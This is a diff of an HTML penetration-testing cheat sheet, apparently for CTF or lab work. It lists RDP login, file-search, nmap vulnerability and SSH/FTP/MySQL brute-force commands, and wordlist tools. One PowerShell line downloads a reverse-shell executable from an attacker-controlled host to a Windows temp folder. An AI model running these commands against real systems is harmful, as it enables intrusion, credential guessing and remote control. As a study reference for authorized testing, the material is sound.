@@ -27,23 +27,33 @@ There is a :
   <p><pre><code>xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard</code></pre>
 	
 <h3 id='n1.2'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;To get stable shell from unstable from PowerShell</h3>
-  <pre><code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'"</code></pre> where filename is the reverse shell
+   FILENAME.exe is the reverse shell
+  <pre><code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'"</code></pre>
   
 <h3 id='n1.3'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Commands to find in:</h3>
 <h4>&nbsp;&nbsp;&nbsp;Linux</h4>
-	<p> <pre><code>find / -type f</code></pre> - Find all files in / directory (-type d for find dirs)
-	<p> <pre><code>find / -type f | grep '&lt;FILE_NAME>'</code></pre> - File name search
-	<p> <pre><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></pre> - Find all path files with ‘config’ in proc dirs
+	Find all files in / directory (-type d for find dirs) -
+	<p> <pre><code>find / -type f</code></pre>
+	File name search -
+	<p> <pre><code>find / -type f | grep '&lt;FILE_NAME>'</code></pre>
+	Find all path files with ‘config’ in proc dirs - 
+	<p> <pre><code>find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null</code></pre>
 		
 <h3 id='n1.4'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Nmap with vulnerse script</h3>
-Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>download</a> script files from github and install it. Thanks for that, Vulners Team!
+Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>download</a> script files from github and install it. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!
 
-   <p> <pre><code> Nmap -Pn &lt;TARGET_IP> --script=vulnerse.nse -p &lt;PORT(S)></code></pre> - Checking for a vulnerability in the software on the server.
-   <p> <pre><code> nmap --script ssh-brute -p &lt;SSH_PORT> &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst</code></pre> - Checking brute force resistance on ssh
-   <p> <pre><code> nmap -d --script ftp-brute -p &lt;FTP_PORT> &lt;TARGET_IP></code></pre> - Checking brute force resistance on ftp
-   <p> <pre><code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP></code></pre> - Checking mysql anonymous login
-   <p> <pre><code> nmap --script mysql-brute -p &lt;MYSQL_PORT> &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst</code></pre> - Attempts to select a pair of login/password to enter the mysql database
-   <p> <pre><code> nmap -sV -p &lt;PORT> –script http-enum &lt;TARGET_IP></code></pre> - Search for hidden folders and files
+   Checking for a vulnerability in the software on the server -
+   <p> <pre><code> Nmap -Pn &lt;TARGET_IP> --script=vulnerse.nse -p &lt;PORT(S)></code></pre>
+   Checking brute force resistance on ssh -
+   <p> <pre><code> nmap --script ssh-brute -p &lt;SSH_PORT> &lt;TARGET_IP> --script-args userdb=users.lst,passdb=passwords.lst</code></pre>
+   Checking brute force resistance on ftp - 
+   <p> <pre><code> nmap -d --script ftp-brute -p &lt;FTP_PORT> &lt;TARGET_IP></code></pre>
+   Checking mysql anonymous login -
+   <p> <pre><code> nmap -sV --script=mysql-empty-password &lt;TARGET_IP></code></pre>
+   Attempts to select a pair of login/password to enter the mysql database -
+   <p> <pre><code> nmap --script mysql-brute -p &lt;MYSQL_PORT> &lt;TARGET_IP> --script-args userdb=users.lst, passdb=passwords.lst</code></pre>
+   Search for hidden folders and files
+   <p> <pre><code> nmap -sV -p &lt;PORT> –script http-enum &lt;TARGET_IP></code></pre>
    <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
 	
 <h2 align='center' id='n2'><em>Payloads</em></h2>
@@ -84,7 +94,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 		<li><h3><a href='https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master'>Tool</a> for hash identification.</h3> 
 			<p> Python file. Powerful.
 		<li><h3><a href='https://www.kali.org/tools/crunch/'>Crunch</a></h3>
-		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <pre><code>crunch 3 3 12345qwerty -o cranch.txt</code></pre>.
+		   <p> This is one of many powerful tools for creating an offline wordlist. With crunch, you can specify numerous options, including min, max, and options. The following example creates a wordlist containing all possible combinations of 3 characters, including 1-5 and qwerty. You can use the -o argument to save. <p>Example: <pre><code>crunch 3 3 12345qwerty -o cranch.txt</code></pre>
 		<li><h3><a href='https://github.com/therodri2/username_generator'>Username generator</h3>
 			<p>Could help create a list with most of the possible combinations if we have a first name and last name. Use git clone and <p> <pre><code>python3 username_generator.py -h</code></pre> shows the tool's help message and optional arguments.
 	</ol>
